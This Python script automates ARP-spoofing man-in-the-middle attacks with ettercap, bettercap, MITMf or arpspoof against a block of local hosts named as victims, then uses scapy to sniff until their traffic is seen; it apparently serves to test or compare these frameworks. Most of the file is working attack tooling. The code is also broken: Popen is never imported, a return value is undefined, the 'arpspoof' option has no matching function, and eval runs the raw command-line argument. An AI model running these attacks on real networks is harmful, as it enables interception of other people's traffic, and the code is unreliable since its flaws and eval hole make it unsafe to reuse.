from scapy.all import sniff
import os
import sys

available_frameworks = ["ettercap", "bettercap", "mitmf", "arpspoof"]
if len(sys.argv) <= 1 or sys.argv[1] not in available_frameworks :
	help_message = "[-] Need to pass framework name as argument. Available frameworks: {}".format(available_frameworks)
	print(help_message)
	exit(1)

EXTERNAL_ADDRESS = "192.168.1.10"
GATEWAY_ADDRESS = "192.168.0.1"
IP_RANGE = (20, 30)

def run_command(cmd):
	process = Popen([cmd], stdout=PIPE, shell=True)
	stdout, stderr = process.communicate()
	return out
 
victims = []
[[ victims.append("192.168.0.%d" % i) for i in range(*IP_RANGE) ]]

# Custom function to be apllied to each sniffed packet
def wait_all_victims(packet):
	src_addr = packet[0][1].src
	dst_addr = packet[0][1].dst
	if src_addr in victims and dst_addr==EXTERNAL_ADDRESS:
		victims.remove(src_addr)
	if len(victims) == 0: #captured all victims
		exit(0)
	
def ettercap():
	cmd = """
	ettercap -Tq -M arp:remote /192.168.0.{}-{}// &
	""".format(*IP_RANGE)
	print(cmd)
	os.system(cmd)


def bettercap():
	cmd = """ 
	bettercap -eval "net.probe on; set arp.spoof.targets 192.168.0.{}-{}; arp.spoof on"  &
	""".format(*IP_RANGE)
	print(cmd)
	os.system(cmd)
	
def mitmf():
	""" This framework have bugs when you execute mitmf.py from outside it's directory. So make sure
	you've copied the source, then cd to it. Also, it does not work when we pass a range of targets, like
	`192.168.0.1-255`, but it does accept a comma separated list like `192.168.0.1,192.168.0.2`"""
	targets = ""
	for v in victims:
		targets += v + ',' 
	targets = targets.rstrip(',')
	cmd = """
	cd MITMf ; python2.7 mitmf.py -i eth0 --spoof --arp --target {} --gateway {} & 
	""".format(targets, GATEWAY_ADDRESS)
	print(cmd)
	os.system(cmd)

def dsniff():
	cmd = """
	echo 1 > /proc/sys/net/ipv4/ip_forward ;
	for x in $(seq {} $(({}-1)) ) ;
	do
		arpspoof -t {} 192.168.0.$x & 
		arpspoof -t 192.168.0.$x {} &
	done
	""".format(*IP_RANGE, GATEWAY_ADDRESS, GATEWAY_ADDRESS)
	print(cmd)
	os.system(cmd)

def main():
	eval(sys.argv[1]+"()")
	try:
		sniff(filter="ip", prn=wait_all_victims)
	except PermissionError:
		print("Need to run as root")

if __name__ == '__main__':
	main()